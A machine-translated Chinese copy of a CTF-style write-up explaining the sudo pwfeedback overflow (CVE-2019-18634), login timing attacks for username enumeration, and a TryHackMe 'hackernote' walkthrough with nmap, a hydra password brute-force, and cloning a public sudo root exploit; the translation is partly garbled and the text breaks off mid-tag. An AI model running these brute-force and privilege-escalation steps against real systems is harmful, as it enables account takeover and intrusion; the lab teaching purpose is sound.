<html>
<head>
<title>Sudo 1.8.25p: A tale of BufferOverflow in linux(CVE-2019–18634)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">sudo 1 . 8 . 25 p:Linux中缓冲溢出的故事(CVE-2019–18634)</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sudo-1-8-25p-a-tale-of-bufferoverflow-in-linux-cve-2019-18634-and-art-of-timing-attacks-in-web-bc6794407942?source=collection_archive---------2-----------------------#2020-04-10">https://infosecwriteups.com/sudo-1-8-25p-a-tale-of-bufferoverflow-in-linux-cve-2019-18634-and-art-of-timing-attacks-in-web-bc6794407942?source=collection_archive---------2-----------------------#2020-04-10</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="98c4" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">web应用程序中的计时攻击艺术</h2></div><blockquote class="kf kg kh"><p id="a98b" class="ki kj kk kl b km kn jr ko kp kq ju kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated">T <strong class="kl ir"> LDR: </strong> <em class="iq">这个博客提供了利用tryhackme上的HACKERNOTE机器的方法的技术细节，并包括该机器的演示。</em> <strong class="kl ir"> <em class="iq">这个Sudo Bug让非特权Linux和macOS用户以Root身份运行命令。</em>T11】</strong></p></blockquote><p id="85d0" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">在Linux或macOS系统中使用的“sudo”实用程序中发现了一个漏洞，该漏洞会让非超级用户(低权限用户)能够执行管理命令。该漏洞注册为“CVE-2019–18634”，影响1.8.26之前的sudo版本。苹果安全研究员Joe Vennix意识到它可以通过sudo配置文件中的“pwfeedback”选项来利用。“pwfeedback”为用户在控制台输入密码时提供可视的星号(*)反馈，在大多数sudo上游版本中默认情况下是不启用的，但某些发行版除外，包括Linux mint和Elementary OS。</p><p id="c38b" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">让我们来谈谈这个“pwdfeedback”</p><blockquote class="kf kg kh"><p id="9c29" class="ki kj kk kl b km kn jr ko kp kq ju kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated">P <strong class="kl ir"> WDFEEDBACK </strong></p></blockquote><p id="e060" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">当你在Linux中用<code class="fe li lj lk ll b">sudo</code>运行一个命令时，终端会提示你输入密码——并且不会给你任何视觉反馈。这里有一个快速的调整，当你输入密码时，会把那些熟悉的星号(*)带回来。</p><p id="b8e7" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">默认情况下，当我们输入超级用户密码时，linux不会在终端上显示任何内容</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/be57ce48002e5a8c1699c048c6b6fbe5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tH1LFnyLu8vAPQa5YrjHgA.png"/></div></div></figure><p id="b514" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">在手机或windows中输入密码时缺少这些“*”！！</p><p id="b11f" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我们可以通过以下步骤启用pwdfeedback函数再次获得这些' * '</p><p id="7206" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">在终端中键入以下内容</p><p id="d955" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">1.<code class="fe li lj lk ll b">sudo visudo</code></p><p id="8c14" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">2.<code class="fe li lj lk ll b">Defaults env_reset</code></p><p id="7d4d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">3.<code class="fe li lj lk ll b">Defaults env_reset,pwfeedback</code></p><p id="c133" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">按Ctrl+X完成编辑，按Y保存更改，按Enter退出(如果您使用的是Ubuntu，这些是步骤)</p><p id="475b" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，当您以超级用户权限键入运行进程的密码时，您将获得宝贵的“*”号。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div class="gh gi ly"><img src="../Images/f55f2ee65bd7cedb5d87d5a2fae17af7.png" data-original-src="https://miro.medium.com/v2/resize:fit:654/format:webp/1*OUtoXPMTMRIMbEY4OqfHvg.png"/></div></figure><p id="08b6" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我们在linux中获得了强大的功能和控制力！！</p><p id="b797" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">但这让我想起蜘蛛侠的名言</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lz"><img src="../Images/93b4468284c07e70e8b3b11a78e3756a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*3bIZv3-SZnn_jgOXhlICDw.jpeg"/></div></div></figure><p id="da88" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><strong class="kl ir">在1.8.26之前的sudo中，如果在/etc/sudoers中启用pwfeedback，用户可以在特权Sudo进程中触发基于堆栈的缓冲区溢出。攻击者需要向tgetpass.c中getln()的stdin传递一个长字符串</strong></p><p id="318d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><strong class="kl ir">现在我们来谈谈web应用中的计时攻击</strong></p><blockquote class="kf kg kh"><p id="72ee" class="ki kj kk kl b km kn jr ko kp kq ju kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated"><strong class="kl ir">定时攻击</strong></p></blockquote><p id="156b" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">计时攻击在web应用领域的有效性一直被低估。人们普遍认为，由于它们的利用性质以及网络抖动在诱发大量噪声方面起着重要作用的事实，它们是不实用的。然而，研究表明，在某些情况下，它们可以被证明是有效的，并产生比标准暴力攻击更好的结果。</p><p id="8259" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这基本上不是攻击web应用程序的功能，而是使用该功能，通过注意功能的输入正确时和功能的输入错误时运行该功能的时间差来确定敏感信息。</p><p id="461f" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">让我们举一个例子来理解这一点…等等，为什么不举hackernote machine中的漏洞的例子，因为我们将在这之后攻击它</p><p id="c649" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，当我们浏览web应用程序时，我们会遇到一个登录表单，需要输入用户名和密码，如下所示</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/7d5c6d0b979acfbabd51ff4e0ad00f85.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*xqpk3tv-T4wx8tawca09dg.png"/></div></div></figure><p id="9bef" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">首先，让我们创建一个名为“test”的用户帐户，密码也是“test”</p><p id="68c9" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在在用户名，我们使用'测试'和用户名，并故意使用错误的密码，你会得到</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/a902651bf14ac84dc08f58f8457a55dc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YSsS6zClre9p3HKUNRf6XA.png"/></div></div></figure><p id="ed5d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这个错误“无效的用户名或密码”现在尝试登录任何不存在的帐户，如“随机123”(这个帐户不存在)，并使用任何密码，如“1234”</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/ebdb29566d275caffa600bd6222ad59c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*L4EWjB2v3gh_edYEIzfSUg.png"/></div></div></figure><p id="98e4" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我们再次得到同样的错误。</p><p id="d482" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这一点的关键是，无论我们试图以现有用户或非现有用户的身份登录，错误都是相同的，因此攻击者无法枚举用户名(哪些帐户在应用程序上注册)，因此攻击者无法知道是否有一个“测试”帐户(因为现有和非现有用户的错误是相同的)。</p><p id="51ba" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">计时错误来了，现在再次重复上述活动，这次观察时间以显示错误。首先使用我们示例中的现有帐户“test”登录，然后使用不存在的帐户“random123”登录。你会看到，当你输入错误的密码为'测试'的错误显示晚于不存在的帐户'随机123 '这意味着错误需要更长的时间来的情况下存在的用户比不存在的用户。</p><p id="29ef" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这样做的原因是因为“测试”用户在那里，所以它存储在后端数据库中，这些数据库将注册用户的密码存储为哈希。因此，当我们尝试使用现有用户登录时，我们提供的密码首先被散列，然后与存储在数据库中的散列进行比较，如果两者都匹配(意味着密码是正确的),我们就是该用户，否则我们将得到错误。此过程需要一些时间，但是如果在登录表单中提供了一个不存在的用户，因为数据库应用程序中没有该用户的列表，则会立即显示错误。</p><blockquote class="kf kg kh"><p id="1116" class="ki kj kk kl b km kn jr ko kp kq ju kr ks kt ku kv kw kx ky kz la lb lc ld le ij bi translated"><strong class="kl ir">黑客笔记演练</strong></p></blockquote><p id="1304" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在是时候将我们到目前为止所学的知识付诸实践了，我们将从tryhackme中破解hackernote机器</p><p id="9f55" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">tryhackme—<a class="ae ma" href="https://tryhackme.com/" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/</a></p><p id="6e5e" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">如果不知道如何在tryhackme上查看这个房间，首先连接到tryhackme的VPN</p><p id="4e99" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">VPN-<a class="ae ma" href="https://tryhackme.com/room/openvpn" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/openvpn</a></p><p id="dffd" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">黑客注-<a class="ae ma" href="https://tryhackme.com/room/hackernote" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/hackernote</a></p><p id="8919" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">首先部署机器</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/907c67ce423b87ed075968c6cf314083.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ydFHiCKdEzM_6Cr-GTNl6A.png"/></div></div></figure><p id="7e55" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在让我们使用nmap在机器上进行侦察</p><p id="169f" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">nmap -sV -Pn [machine-ip]</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/bb08556b54c4db579a824288413802fe.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*LeahbNeNOD89fdH7BN4uwg.png"/></div></div></figure><p id="309a" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">端口80是开放的，让我们浏览网站</p><p id="5a0b" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><a class="ae ma" href="http://[machine-ip]" rel="noopener ugc nofollow" target="_blank">http://【machine-IP】</a></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/45c6ceeb8f05ccdd42cd708d58e25fed.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iHPyosb6-lUIPZe9HYFCpA.png"/></div></div></figure><p id="3aba" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我们看到这个页面，让我们点击登录页面按钮</p><p id="b57d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">因为我已经解释了使用时间差异的用户枚举的概念，现在我们需要枚举web应用程序的用户。现在我们将使用包含用户名的单词列表的时间缺陷来确定单词列表上是否存在任何具有用户名的帐户</p><p id="b00c" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我们将使用这个单词表来枚举用户名</p><div class="mb mc gp gr md me"><a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">丹尼尔·米斯勒/塞克里斯特</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">SecLists是安全测试人员的伴侣。它是安全期间使用的多种类型列表的集合…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">github.com</p></div></div><div class="mn l"><div class="mo l mp mq mr mn ms lw me"/></div></div></a></div><p id="1c33" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在我们需要创建或使用一个脚本来利用这个计时缺陷</p><p id="9d4d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">这个漏洞脚本已经在tryhackme的这个房间里给出了</p><p id="c417" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">脚本链接—<a class="ae ma" href="https://github.com/NinjaJc01/hackerNoteExploits" rel="noopener ugc nofollow" target="_blank">https://github.com/NinjaJc01/hackerNoteExploits</a></p><p id="c9b0" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在这个存储库包含以下内容</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/792dac5130fd04e875930ec64ba0be1a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*rrirpMl2GCcU3dSAZvmKcA.png"/></div></div></figure><p id="6545" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，我们需要使用python exploit或go exploit with names.txt wordlist，您可以使用其中任何一个，运行脚本后，您将获得一个有效的用户名“james”</p><p id="cbd4" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">顺便说一下，您也可以使用Burp套件请求计时器扩展来实现这一点</p><p id="ff49" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">在我们得到一个有效的用户名后</p><p id="4054" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">让我们单击“james”的“忘记密码”来获得密码提示</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/28eb5a12706550b81fb461e93b632de7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GYCMfX0qTS3j2-p03z4A9Q.png"/></div></div></figure><p id="2230" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">好了，现在我们需要创建自定义单词表来强制输入密码。这个单词表应该包含颜色和数字(比如white007)</p><p id="330e" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">为此，我们可以使用hashcat-util的组合器来组合单词列表</p><p id="40a6" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">所以我们需要为颜色创建一个单词表，为数字创建另一个单词表。</p><div class="mb mc gp gr md me"><a href="https://github.com/hashcat/hashcat-utils/releases" rel="noopener  ugc nofollow" target="_blank"><div class="mf ab fo"><div class="mg ab mh cl cj mi"><h2 class="bd ir gy z fp mj fr fs mk fu fw ip bi translated">hashcat/hashcat-utils</h2><div class="ml l"><h3 class="bd b gy z fp mj fr fs mk fu fw dk translated">今天就创建您的免费GitHub帐户，订阅这个新版本的资源库，并与40…</h3></div><div class="mm l"><p class="bd b dl z fp mj fr fs mk fu fw dk translated">github.com</p></div></div><div class="mn l"><div class="mt l mp mq mr mn ms lw me"/></div></div></a></div><p id="cf0b" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在tryhackme已经提供了单词表，一个单词表包含颜色名称，另一个包含数字，我们需要使用hashcat-utils将它们组合在一起</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/723cfe3ea8237d3258922f1ca3cfc30c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SR6qiIZaGivoTiDNQu4bYg.png"/></div></div></figure><p id="b298" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">下载hashcat-utils后进入src目录，运行<code class="fe li lj lk ll b">make</code>命令</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/0c464b28885022761503c1d0a668af0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DgIw_pkEfgEZmo8RiBrYYQ.png"/></div></div></figure><p id="40ee" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">复制从hashcat-utils的src文件夹中的tryhackme下载的两个单词列表。</p><p id="f622" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在运行以下命令</p><p id="a557" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">./combinator.bin color.txt number.txt &gt; wordlist.txt</code></p><p id="959d" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在你已经通过创建每一种可能的排列将两个单词列表合并成一个单词列表“wordlist.txt ”,让我们强制使用“james”的密码</p><p id="b0ad" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">因为在尝试登录时，bruteforcing将首先检查我们的请求是如何到达api的。为此，我们将使用谷歌浏览器中的开发者工具。</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/92655b77d616731e20d1b8e051ca35f9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Hpqw27nC8XqF1hA1w7xfQ.png"/></div></div></figure><p id="83df" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">上图向我们展示了登录请求是如何进行的。</p><p id="1797" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">它正在向“/api/user/login”端点发送json格式的数据，好的，让我们使用hydra强制执行此操作</p><p id="00ba" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，为了方便起见，这个端点也接受表单格式的数据，所以我们不需要发送json格式的数据，我们可以简单地使用应用程序表单格式</p><p id="dcfe" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">运行以下命令</p><p id="be01" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">hydra -l james -P wordlist.txt [machine-ip] http-post-form '/api/user/login:username=^USER^&amp;pass=^PASS^:F="Invalid username or password"</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/d724c3493759ad299bd04ea859f879b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lslKnUj0BH3YSHpXuXyHfw.png"/></div></div></figure><p id="9fbe" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">耶！！！我们获得了“james”的密码“blue7 ”,现在我们将使用这些凭据登录web应用程序</p><p id="4379" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">所以在伐木之后，我们得到</p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/22a7136968ba977be035e7a9d2e8c0c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7g_aD3CbrzivHbrNYURPJw.png"/></div></div></figure><p id="dfa2" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">所以我们得到了用户‘James’的ssh密码，让SSH进入机器</p><p id="87d3" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">ssh james@[machine-ip]</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/c135a72921e636b055911e3fd55c416a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QfKdIHBlFztVQrh6nydaSQ.png"/></div></div></figure><p id="f789" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在我们得到了用户外壳</p><p id="5aaa" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，我们需要将权限提升到root权限，以解决机器问题</p><p id="5d2f" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">因此，对于root用户，让我们检查一下我们可以作为root用户运行哪些命令</p><p id="b3e2" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">sudo -l</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/730696c3cc76dcd98335b9090bc79aaf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lBkwhAVbJwe9fH-fXK20qg.png"/></div></div></figure><p id="32d5" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">该死的。我们不在sudoers中，但是等一下，看看那些星号，它意味着pwfeedback在/etc/sudoers中启用</p><p id="3a05" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">我已经解释了在这种情况下缓冲区溢出的漏洞，它会给我们提供根外壳</p><p id="6b99" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">因此，让我们利用https://github.com/saleemrashid/的漏洞将权限提升到超级用户</p><p id="7f38" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">git clone </code><a class="ae ma" href="https://github.com/saleemrashid/sudo-cve-2019-18634.git" rel="noopener ugc nofollow" target="_blank">https://github.com/saleemrashid/sudo-cve-2019-18634.git</a></p><p id="00ff" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在，在克隆存储库之后，进入<a class="ae ma" href="https://github.com/saleemrashid/sudo-cve-2019-18634.git" rel="noopener ugc nofollow" target="_blank">sudo-CVE-2019–18634</a>文件夹</p><p id="5491" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">并键入命令</p><p id="2078" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">make</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/2e74297a30e5494a891e54849a203ecb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zpOBPAciNkFTnk6d3j-TYw.png"/></div></div></figure><p id="2575" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated">现在exploit.c文件是编译类型</p><p id="f27e" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi translated"><code class="fe li lj lk ll b">ls</code></p><figure class="ln lo lp lq gt lr gh gi paragraph-image"><div role="button" tabindex="0" class="ls lt di lu bf lv"><div class="gh gi lm"><img src="../Images/ea25896b7035723c2d9adc2cb1cea79d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-kVrP-J6BhGDpjtJxp2k6Q.png"/></div></div></figure><p id="e712" class="pw-post-body-paragraph ki kj iq kl b km kn jr ko kp kq ju kr lf kt ku kv lg kx ky kz lh lb lc ld le ij bi 